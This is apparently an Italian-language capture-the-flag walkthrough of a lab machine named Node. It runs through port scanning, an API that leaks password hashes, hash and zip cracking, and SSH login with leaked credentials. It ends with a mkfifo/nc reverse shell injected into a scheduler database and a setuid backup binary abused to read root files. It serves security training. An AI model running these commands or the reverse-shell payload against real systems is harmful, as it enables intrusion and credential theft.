@@ -1,0 +1,404 @@
+10.10.10.58
+
+
+sudo masscan -p1-65535 --rate 1000 --open --banners -e tun0 10.10.10.58
+[sudo] password for daerves: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-29 11:54:16 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 22/tcp on 10.10.10.58                                     
+Discovered open port 3000/tcp on 10.10.10.58 
+
+
+
+nmap -sC -sV -Pn -p22,3000 10.10.10.58
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-29 11:56 GMT
+Nmap scan report for 10.10.10.58
+Host is up (0.061s latency).
+
+PORT     STATE SERVICE            VERSION
+22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
+|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
+3000/tcp open  hadoop-tasktracker Apache Hadoop
+| hadoop-datanode-info: 
+|_  Logs: /login
+| hadoop-tasktracker-info: 
+|_  Logs: /login
+|_http-title: MyPlace
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+sulla porta 3000 c'è hadoop 
+
+con una sorta di social network:
+
+
+
+MyPlace is a new collaboration project by the gurus of social media to bring you the most secure platform ever to meet new people.
+
+Sign ups are closed whilst we finish up development, but feel free to take a look at the profiles of our existing users.
+
+
+ci sono i profili di 3 utenti:
+
+tom
+mark
+rastating
+
+per tutti e tre non ci sono ulteriori informazioni:
+
+User bios are still not completed, check back later to learn more about rastating! 
+
+c'è una oagina di login:
+
+http://10.10.10.58:3000/login
+
+per cui non ho le credenziali, avendo gli usernames potrei eventualmente provare a fare un bruteforce se non trovo altro.
+
+per prima cosa provo a fare fuzzing
+
+ wfuzz -w /usr/share/wordlists/dirb/big.txt http://10.10.10.58:3000/FUZZ
+
+ wfuzz -w /usr/share/wordlists/dirb/big.txt http://10.10.10.58:3000/FUZZ | grep -v 3861
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.58:3000/FUZZ
+Total requests: 20469
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+
+=====================================================================
+
+000002716:   301        9 L      15 W       171 Ch      "assets"                                            
+000013474:   301        9 L      15 W       175 Ch      "partials"                                          
+000018777:   301        9 L      15 W       173 Ch      "uploads"                                           
+000019078:   301        9 L      15 W       171 Ch      "vendor"
+
+
+wfuzz -w /usr/share/wordlists/dirb/big.txt http://10.10.10.58:3000/partials/FUZZ
+
+Target: http://10.10.10.58:3000/partials/FUZZ
+Total requests: 20469
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+
+utilizzando burp vedo che vengono fatte molte richieste quando si carica la pagina/ si va nella pagina di login 
+
+tra cui molte richieste a file javascript (magari il backend è javascript??)
+e richieste a un path che inizia per api:
+
+
+GET /api/users/latest HTTP/1.1
+Host: 10.10.10.58:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.10.58:3000/
+If-None-Match: W/"1c1-uNG6P2Gk3GDSM3qIsuNDtGcTJkk"
+
+
+provo a raggiunger altre parti di questa api:
+
+GET /api/users/ HTTP/1.1
+Host: 10.10.10.58:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.10.58:3000/
+If-None-Match: W/"1c1-uNG6P2Gk3GDSM3qIsuNDtGcTJkk"
+
+e ottengo:
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 611
+ETag: W/"263-mJMXKDfX6c4pdWF3bLjHuBIvsM0"
+Date: Wed, 29 Dec 2021 12:20:40 GMT
+Connection: close
+
+[
+    {"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
+    {"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
+    {"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
+    {"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}
+]
+
+non so precisamente di che tipologia di hash si tratta, provo con hashid:
+
+hashid -m 'dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af'
+Analyzing 'dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af'
+[+] Snefru-256 
+[+] SHA-256 [Hashcat Mode: 1400]
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 [Hashcat Mode: 6900]
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 [Hashcat Mode: 5000]
+[+] Skein-256 
+[+] Skein-512(256)
+
+
+non mi da un'indicazione chiara, quindi non credo di riuscire a crackarli, posso provare ad usare ancora l'api magari usando l'id degli utenti per vedere se trovo maggiori info prima di provare con Hashcat
+
+
+
+
+wfuzz -w /usr/share/wordlists/dirb/big.txt http://10.10.10.58:3000/api/FUZZ | grep -v 3861                                 130 ⨯
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.58:3000/api/FUZZ
+Total requests: 20469
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                             
+=====================================================================
+
+000016245:   200        0 L      1 W        23 Ch       "session"                                                           
+000018906:   200        0 L      1 W        611 Ch      "users"
+
+
+GET /api/session HTTP/1.1
+Host: 10.10.10.58:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.10.58:3000/
+If-None-Match: W/"1c1-uNG6P2Gk3GDSM3qIsuNDtGcTJkk"
+
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 23
+ETag: W/"17-VIEFRCuHQRfwSbpuk4+iLdGeWgY"
+Date: Wed, 29 Dec 2021 16:36:21 GMT
+Connection: close
+
+{"authenticated":false}
+
+
+non trovo altro, devo fare bruteforce della pwd, magari quella dell'amministratore.
+
+Provo sia a fare bruteforce direttamente sul sito con hydra sia con hashcat 
+
+
+POST /api/session/authenticate HTTP/1.1
+Host: 10.10.10.58:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Content-Length: 42
+Origin: http://10.10.10.58:3000
+Connection: close
+Referer: http://10.10.10.58:3000/login
+
+{"username":"admin","password":"password"}
+
+
+il formato è json
+
+
+non c'è bisogno di usare hydra perchè con hashcat si trova molto velocemente:
+
+hashcat -a 0 -m 1400 hash_admin  /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
+
+una volta entrato con credenziali:
+
+myP14ceAdm1nAcc0uNT:manchester 
+
+intanto trovo anche le credenziali di tutti gli altri utenti, potrebbero essere utili per password reuse ecc:
+
+mark:snowflake
+tom:spongebob
+
+
+accedndo come admin ho la possibilità di scaricare un backup (myplace.backup)
+sembra essere codificato in base64 
+
+lo decodifico con 
+base64 -d myplace.backup > backup.zip
+
+il file è protetto da password, provo a crackare la pwd:
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+
+PASSWORD FOUND!!!!: pw == magicword
+
+
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+
+
+mark:5AYRft73VtFpc84k
+
+con queste credenziali riesco ad accedere anche con ssh, ora ho una shell come mark sulla macchina:
+
+mark@node:~$ id
+uid=1001(mark) gid=1001(mark) groups=1001(mark)
+
+mark@node:/home$ ll
+total 20
+drwxr-xr-x  5 root root 4096 Aug 31  2017 ./
+drwxr-xr-x 25 root root 4096 Sep  2  2017 ../
+drwxr-xr-x  2 root root 4096 Aug 31  2017 frank/
+drwxr-xr-x  3 root root 4096 Sep  3  2017 mark/
+drwxr-xr-x  6 root root 4096 Sep  3  2017 tom/
+
+mark non ha file user.txt
+
+mark@node:/home$ cat tom/user.txt
+cat: tom/user.txt: Permission denied
+
+devi diventare tom per prendere file user.
+
+
+nel db mongodb a cui ho accesso l'unica collezione è quella degli utenti già visibile tramite api quindi non trovo nulla di nuovo
+
+mark@node:/var/www/myplace$ ps -aux | grep tom
+tom       1232  0.0  6.1 1009080 46368 ?       Ssl  11:45   0:04 /usr/bin/node /var/scheduler/app.js
+tom       1238  0.3  8.7 1053140 66316 ?       Ssl  11:45   1:14 /usr/bin/node /var/www/myplace/app.js
+
+/var/www/myplace/app.js è quella che già conosco mentre /var/scheduler/app.js è un'altro tipo di applicazione:
+
+const exec        = require('child_process').exec;
+const MongoClient = require('mongodb').MongoClient;
+const ObjectID    = require('mongodb').ObjectID;
+const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log('[!] Failed to connect to mongodb');
+    return;
+  }
+
+  setInterval(function () {
+    db.collection('tasks').find().toArray(function (error, docs) {
+      if (!error && docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log('Executing task ' + doc._id + '...');
+            exec(doc.cmd);
+            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log('Something went wrong: ' + error);
+      }
+    });
+  }, 30000);
+
+});
+
+
+in questo caso si collega ad un altro database (scheduler) ed esegue i comandi che sono all'interno della collection doc
+provo a vedere cosa c'è all'interno
+
+
+mongo 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?mechanism=DEFAULT&authSource=scheduler'
+
+> show collections
+tasks
+
+> db.tasks.find()
+>
+> db.tasks.count()
+0
+
+pare che non ci siano tasks al momento
+forse perchè vengono cancellati:
+
+db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
+
+probabilmente posso inserire dei task da far eseguire ma non so con quali permessi, quindi per prima cosa inserisco qualcsoa per capire chi esegue questi comandi:
+
+db.tasks.insert({"cmd":"id > /tmp/id.txt"})
+
+
+mark@node:/tmp$ cat id.txt
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+
+sono proprio utente tom quindi posso leggere il file user.txt o meglio ancora ottenere una shell
+
+db.tasks.insert({"cmd":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 4242 >/tmp/f"})
+
+con questo ottengo una reverse shell come tom
+
+$ id
+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+
+$ cat user.txt
+e1156acc3574e04b06908ecf76be91b1
+
+
+a questo punto analizzando di nuovo il codice dell'app.js trovo:
+
+var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
+
+questo sembra essere un bin locale, non uno di sistema
+
+-rwsr-xr--  1 root admin 16484 Sep  3  2017 backup      
+
+viene eseguito come root ma può essere eseguito anche da chi è nel gruppo admin, e l'utente tom ne fa parte
+
+tom@node:/usr/local/bin$ file backup
+file backup
+backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
+
+
+non mi da nessuna indicazione sull'utilizzo quando provo a lanciarlo
+
+./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
+
+già provando a lanciarlo con la backup key corretta c'è qualcosa che non va infatti ottengo:
+
+3d98a8d0230167104d474 /tmp2f4fd2d9386ea7033e52b7c740afc 
+zip warning: No such device or address
+
+
+
+$ cd /
+$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root |base64 -d > tmp/root.zip
+$ cd tmp
+$ unzip -P magicword root.zip
+Archive:  root.zip
+   creating: root/
+  inflating: root/.profile           
+  inflating: root/.bash_history      
+   creating: root/.cache/
+ extracting: root/.cache/motd.legal-displayed  
+ extracting: root/root.txt           
+  inflating: root/.bashrc            
+  inflating: root/.viminfo           
+   creating: root/.nano/
+ extracting: root/.nano/search_history  
+$ cat root/root.txt
+1722e99ca5f353b362556a62bd5e6be0
+
+
+
+
